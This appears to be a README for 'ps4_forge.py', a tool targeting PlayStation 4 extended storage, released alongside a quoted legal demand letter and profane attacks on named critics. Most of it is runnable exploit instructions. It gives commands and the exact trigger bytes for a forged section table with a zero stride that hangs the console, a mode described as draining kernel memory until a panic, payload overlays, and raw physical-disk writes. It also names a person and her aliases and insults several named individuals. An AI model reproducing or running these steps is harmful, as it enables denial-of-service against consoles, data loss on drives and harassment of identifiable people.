# fuck you.

To everyone who called it bullshit before reading a single byte. To everyone who wrote "skid" in a Discord and went back to their game. To everyone who watched the repo land and said nothing, then privately asked someone else whether it was real. To the four or five named in the receipts section, and to the dozens unnamed who did the same thing in smaller rooms. To Sony Interactive Entertainment's legal department, who sent a letter to Angela Redgrave with my aliases on it and a response deadline of October 2. This is for you. Read it or don't. The drive is on the desk either way.

You doubted the format before it was published. Then it was published, and you doubted the offsets. Then the offsets were confirmed against two drives, and you doubted the mechanism. Then the mechanism was falsified *by the person who proposed it*, in public, in writing, and you *still* didn't retract. That's not skepticism. That's a posture. Skepticism updates. You don't. You haven't. You won't.

Here is the honest state of the work, written for the record, because the record is the only thing that outlives this conversation.

## This is rushed. Sony is hunting me. I don't care.

I'll say it before anyone else does, because I know it and I'd rather be the one to admit it. The tool is one iteration old. This README was written in a night. The section-table forger's entry layout is a *guess* extrapolated from a decompile that I got wrong the first time and corrected in public. The `ENTRY_SIZE=0x38` is a number I picked because the fields I could see fit in it, not because I confirmed it against a real PS4-written table. The `--table-off` default assumes a partition at LBA 2048 because that's what most USB drives use, not because I verified it on the target. Half the constants are placeholders. The other half are placeholders with comments that say they're placeholders.

I'm shipping it anyway. Not because it's finished — it isn't — but because it's *runnable*, and the only way any of this gets finished is if it's in people's hands where they can break it. Every person who runs `--scan` and pastes the output either confirms the layout or refutes it. Both are progress.

Sony's letter is dated September 18, 2026. It's from Stephanie Burns, SVP & General Counsel at SIE, 2207 Bridgepointe Parkway, San Mateo, CA 94404. It's addressed to Angela Redgrave, aliases "bel" / "belsploit," address on file. Subject line: *RE: Unauthorized Public Disclosure of "Fahrenheit" Security Research and Related Materials — Preservation of Evidence and Demand for Immediate Cessation.* It demands that I cease and desist from publishing, preserve all evidence including `kernel_panic.img` and `diag.ps1` (which aren't in the public repo but are named in their preservation demand), remove or restrict access to the write-up, provide technical information to their security team, and respond in writing no later than October 2, 2026. It cites CFAA (18 U.S.C. § 1030), DMCA § 1201, breach of PSN ToS and the PlayStation Software License Agreement, misappropriation of trade secrets, and injunctive relief. It reserves the right to refer the matter to federal, state, or local law enforcement.

I'm not taking anything down. The letter is public in this README now. That's the response. The rest is what it's always been.

## What this is

One tool. `ps4_forge.py`. Merged from what used to be `fahrenheit.py` and `pfs_forge.py` so you don't have to pick one, remember two flag sets, or install two scripts that share ninety percent of the same raw-I/O layer.

It does two things:

- **Record mode** (`--mode record`): reads the metadata record from a PS4-formatted drive at `0x6000`, patches the capacity length fields, overlays a payload, and can write the result back to a physical disk. This is the Fahrenheit functionality.
- **PFS modes** (`--mode loop`, `--mode leak`, `--mode payload`, `--mode all`): forges a PFS section table that drives the walker bug in `pfs_mount`, and can write the result back to a physical disk. This is the pfs_forge functionality.

Plus three read-only commands that do not write anything, ever:

- `--list` — enumerate physical disks
- `--diagnose` — read and report the record header at `0x6000`
- `--scan` — scan for section-table-like patterns

That's it. One file, one `--force` gate, one `--base` requirement, one verification path.

## Here is how to run it.

No build step. No dependencies beyond Python 3.10 and elevation (Administrator on Windows, root on Linux). `jm_real.bin` is required for any write and is included in the repo. `payload.bin` is optional and included.

### Enumerate disks

```powershell
python ps4_forge.py --list
```

Prints index, size, interface, media type, model. Note the index of your USB drive. That's what you pass as `--disk N`.

### Diagnose (read-only)

```powershell
python ps4_forge.py --diagnose --disk 1
```

Reads `0x6000` through `0x6080` and prints the label, version, `len_a`, `len_b`, and the first 128 bytes of the body. Does not write anything. If it prints `label: NOT FOUND in first 64 KB`, your drive has no PS4 metadata record and there's nothing to forge against.

### Scan for the section table (read-only)

```powershell
python ps4_forge.py --scan --disk 1 --scan-end 0x200000
```

Looks for pairs of consecutive entries with plausible `id`, `name_len`, `stride`, plus a string-search for `blk_bitmap` because the names are inline. If it prints candidate offsets, those are candidates. **Multiple candidates is normal.** The right offset is the one that looks like a real table when you merge with `--no-write --mode loop` and inspect in HxD. Run the merge against each candidate, look at the bytes at the candidate offset, and pick the one that produces the `id/flags/name_len/stride/name` layout below. Nothing gets written by `--scan` or by `--no-write`.

### Record mode — Fahrenheit functionality

Merge only, no write:

```powershell
python ps4_forge.py --mode record --payload payload.bin --no-write
```

Produces `merged_record.bin`. Open it in HxD next to `jm_real.bin`. Only `len_a`, `len_b`, and the body should differ.

Write:

```powershell
python ps4_forge.py --mode record --payload payload.bin --disk 1 --force
```

Saves the MBR, dismounts volumes, writes the record, restores the MBR, verifies the label and length fields. `--force` is mandatory. Do not run this on a drive you care about.

### PFS mode — loop (bug A)

Merge a loop-mode table without writing:

```powershell
python ps4_forge.py --mode loop --table-off 0x100000 --no-write
```

You want to see at `--table-off`:

```
00 00 00 00 02 00 00 00     <- id = 2
00 00 00 00                 <- flags = 0
0b 00 00 00                 <- name_len = 11
00 00 00 00                 <- stride = 0   <- the bug
62 6c 6b 5f 62 69 74 6d 61 70  <- "blk_bitmap"
```

Write it:

```powershell
python ps4_forge.py --mode loop --table-off 0x100000 --disk 1 --force
```

Eject cleanly. Insert. Tap "Use This Extended Storage." Watch the LED. If it goes solid and the console stops responding, bug A fired. Power-cycle to recover. That is the PoC.

### PFS mode — leak (bug A + allocator drain)

```powershell
python ps4_forge.py --mode leak --table-off 0x100000 --disk 1 --force
```

Same `stride=0`, but `name_len=0` makes the `strncmp` return zero immediately, the `blk_bitmap` branch fires every iteration, and each cycle leaks **at least 0x200 bytes, plus whatever buffer cache allocation the read pulls in — likely 0x2000 to 0x10000 per iteration.** The console runs out of kernel memory and reboots with a panic.

### PFS mode — all (loop + leak + payload)

```powershell
python ps4_forge.py --mode all --payload payload.bin --table-off 0x100000 --disk 1 --force
```

Writes both trigger entries back to back and overlays the payload at `--body-off`.

If `--scan` finds nothing, the table is encrypted and none of this reaches the walker.

## Command matrix

| Task | Command |
|---|---|
| Enumerate disks | `python ps4_forge.py --list` |
| Read record, no write | `python ps4_forge.py --diagnose --disk 1` |
| Scan for section table | `python ps4_forge.py --scan --disk 1 --scan-end 0x200000` |
| Record merge only | `python ps4_forge.py --mode record --payload payload.bin --no-write` |
| Record write | `python ps4_forge.py --mode record --payload payload.bin --disk 1 --force` |
| PFS loop merge only | `python ps4_forge.py --mode loop --table-off 0x100000 --no-write` |
| PFS loop write | `python ps4_forge.py --mode loop --table-off 0x100000 --disk 1 --force` |
| PFS leak write | `python ps4_forge.py --mode leak --table-off 0x100000 --disk 1 --force` |
| PFS all write | `python ps4_forge.py --mode all --payload payload.bin --table-off 0x100000 --disk 1 --force` |

## What has been established.

The metadata record format at `0x6000` is real. Captured from a PS4-formatted drive. Label, version, `len_a`, `len_b`, body offset — all observed. Offsets match across two drives.

The capacity-spoof hypothesis is falsified. The values in the record do not control the PS4's Extended Storage display, do not bypass the 250 GB minimum, do not change anything the console reads. Tested twice. SCSI `READ CAPACITY` is the source, and it comes from the USB bridge firmware. Not in dispute.

Bug B of the PFS walker does not exist. I claimed it did. I was wrong. The comparison helper stops on null in the constant argument, not the attacker-controlled one, and the constant is 11 bytes. Maximum overread is zero. Retracted.

Bug A of the PFS walker is real. `pfs_mount` reads block 0 of the partition, walks a section table with a stride field at entry offset `0x0C`. If that field is zero and the entry's `id` is nonzero, the walker never advances. Not in dispute.

The payload path is unverified. Whether the walker's stuck loop is reachable depends on the section table being plaintext at a known offset. That is exactly what `--scan` is for.

The exploit chain is not complete. This is not a jailbreak. It has never been called one by anyone who read the code.

## What Sony actually says.

Their letter claims, without conceding any factual or legal conclusions, that my conduct may have included:

- Conducting security research or testing directed at SIE systems or software without authorization;
- Circumventing technological protection measures applied to SIE software or systems;
- Obtaining, accessing, or attempting to access information or systems without authorization;
- Publishing, distributing, or otherwise disseminating vulnerability information, proof-of-concept code, exploit-enabling materials, or detailed technical analyses;
- Developing, testing, or disseminating tools or materials designed to exploit vulnerabilities in SIE systems or software;
- Encouraging or facilitating others to engage in similar conduct.

They say the disclosure was made publicly without prior notification to SIE's security team and not through SIE's vulnerability disclosure program. They say distributing the material creates a foreseeable risk that others will attempt to use it on live systems or user devices. They say it forces SIE to divert engineering and security resources to incident response rather than coordinated remediation. They reserve the right to supplement or modify their understanding as their investigation proceeds.

None of that changes the record at `0x6000`, the walker bug in `FUN_00ea1480`, or the tool on disk. It's the same letter any console researcher gets when the work stops being deniable.

## Why Sony is actually hunting me.

Because the work is **real**, **public**, **runnable**, and **targets their platform**. They can't disprove the record. They can't unsee the walker bug. They can't pretend `ps4_forge.py` doesn't exist. They can only try to bury it.

They call it unauthorized access, circumvention, dissemination of exploit-enabling material. They cite the PSN ToS and the Software License Agreement. They quote their own vulnerability disclosure program as if I had any obligation to use it, as if using it were a precondition for publishing. It isn't. It never has been. Every major console security researcher publishes outside vendor programs, because vendor programs are designed to keep findings quiet until the vendor is ready — which is often never.

The alternative they propose is: report privately, wait, let them decide when and how the disclosure happens, and if they decide not to remediate, the report stays quietly closed forever. That's not disclosure. That's a mutual non-disclosure agreement dressed up as responsible practice.

I published. They sent a letter. That's the sequence. That's what they do.

## To the specific people.

To Yenyen: you called it nonsense before the first byte was public, then said nothing when the byte turned out to be real. Fuck you.

To 0xMansoor: someone asked you for a kernel value. You called them a skid. The value is in a public dump. Fuck you.

To Saudidos: same pattern. A question treated as an admission. Fuck you.

To Genzfandz: called me a fraud on X, no evidence. Fuck you.

To the deft one: you invented "belshit" and the name circulated. Fuck you.

To Sony's legal department: the letter is in this README. Come read it. The rest of the response is the rest of the README. There's no version of this where I take it down and pretend the work didn't happen.

## File layout

| File | Purpose |
|---|---|
| `ps4_forge.py` | The tool. Everything. Record mode and PFS modes. |
| `jm_real.bin` | 16 MB reference record from a PS4-formatted drive. Required for any write. |
| `payload.bin` | Optional payload. Overlaid at `--body-off` (default `0x6040`) in record and all modes. |
| `merged_record.bin` | Output of the last `--mode record` merge. |
| `merged_loop.bin` | Output of the last `--mode loop` merge. |
| `merged_leak.bin` | Output of the last `--mode leak` merge. |
| `merged_all.bin` | Output of the last `--mode all` merge. |
| `README.md` | This file. |

## Recovery from a bad write

Zero the record region (preserves the MBR, wipes the record):

```powershell
$h = [IO.File]::Open('\\.\PhysicalDrive1', 'Open', 'ReadWrite')
$h.Seek(0x6000, 'Begin') | Out-Null
$zeros = New-Object byte[] 0x1000
$h.Write($zeros, 0, 0x1000)
$h.Close()
```

Full wipe, back to unformatted:

```powershell
diskpart
> select disk 1
> clean
> exit
```

Then format as FAT32 or exFAT, or re-format on the PS4 to regenerate the record.

## Sign-off.

The work is rushed. The tool is one iteration old. Half the constants are placeholders. The retractions are public, and there are two of them, and they were made by me, in writing, the moment I found out I was wrong. That is the standard I'm holding myself to.

The record is at `0x6000`. The walker bug is in `FUN_00ea1480`. The tool is on disk. Sony's letter is in this document. There's nothing to take down that hasn't already been read by everyone who cares.

Run the command or get out of the way. Silence is not.

— bel · [jb.0d01.wtf](https://jb.0d01.wtf) · [@belsploit](https://x.com/belsploit)